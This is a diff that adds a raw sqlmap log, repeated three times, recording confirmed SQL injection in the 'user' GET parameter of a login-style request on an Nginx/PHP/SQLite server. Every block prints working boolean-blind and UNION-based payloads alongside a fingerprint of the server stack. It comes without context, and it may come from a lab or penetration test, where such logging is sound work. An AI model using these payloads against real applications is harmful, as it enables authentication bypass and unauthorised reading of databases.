@@ -1,0 +1,42 @@
+sqlmap identified the following injection point(s) with a total of 149 HTTP(s) requests:
+---
+Parameter: user (GET)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: user=admin' AND CASE WHEN 7355=7355 THEN 7355 ELSE JSON(CHAR(85,78,89,108)) END AND 'NrJa'='NrJa&pass=admin
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 column
+    Payload: user=-3638' UNION ALL SELECT CHAR(113,98,107,98,113)||CHAR(66,75,77,89,67,119,109,79,66,84,98,100,68,121,84,71,117,66,78,90,107,106,85,107,87,86,84,110,118,97,90,89,116,72,101,114,70,116,111,84)||CHAR(113,122,112,112,113)-- tlJs&pass=admin
+---
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.24.0, PHP 8.3.6
+back-end DBMS: SQLite
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: user (GET)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: user=admin' AND CASE WHEN 7355=7355 THEN 7355 ELSE JSON(CHAR(85,78,89,108)) END AND 'NrJa'='NrJa&pass=admin
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 column
+    Payload: user=-3638' UNION ALL SELECT CHAR(113,98,107,98,113)||CHAR(66,75,77,89,67,119,109,79,66,84,98,100,68,121,84,71,117,66,78,90,107,106,85,107,87,86,84,110,118,97,90,89,116,72,101,114,70,116,111,84)||CHAR(113,122,112,112,113)-- tlJs&pass=admin
+---
+web server operating system: Linux Ubuntu
+web application technology: PHP 8.3.6, Nginx 1.24.0
+back-end DBMS: SQLite
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: user (GET)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: user=admin' AND CASE WHEN 7355=7355 THEN 7355 ELSE JSON(CHAR(85,78,89,108)) END AND 'NrJa'='NrJa&pass=admin
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 column
+    Payload: user=-3638' UNION ALL SELECT CHAR(113,98,107,98,113)||CHAR(66,75,77,89,67,119,109,79,66,84,98,100,68,121,84,71,117,66,78,90,107,106,85,107,87,86,84,110,118,97,90,89,116,72,101,114,70,116,111,84)||CHAR(113,122,112,112,113)-- tlJs&pass=admin
+---
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.24.0, PHP 8.3.6
+back-end DBMS: SQLite
